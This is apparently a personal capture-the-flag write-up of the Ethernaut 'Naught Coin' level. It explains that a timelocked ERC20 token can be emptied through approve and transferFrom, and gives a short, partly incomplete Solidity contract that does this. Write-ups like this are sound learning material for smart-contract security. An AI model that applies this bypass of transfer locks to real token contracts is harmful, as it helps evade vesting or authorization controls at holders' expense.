Naught Coin
Difficulty 5/10

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec
The OpenZeppelin codebase

220412 16:16 KST, well, since this is not blocking approve and transfer from,
I just need to make a smart contract
and approve it as spender, then make the smart contract transferfromt he tokent to some other account.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract Naughty {
    IERC20 public erc20;
    constructor(address _target) {
        erc20 = IERC20(_target);
    }
    function send(address from) external returns(bool) {
            erc20.transferFrom(
            from,
            0x01De7E8d9fEb4E6f088619e1A09a09879318F5C8,
            1000000*10**18
        );
    }
}

and press approve by 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

at address []
and approve

Naught Coin
Level completed!
Difficulty 5/10

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.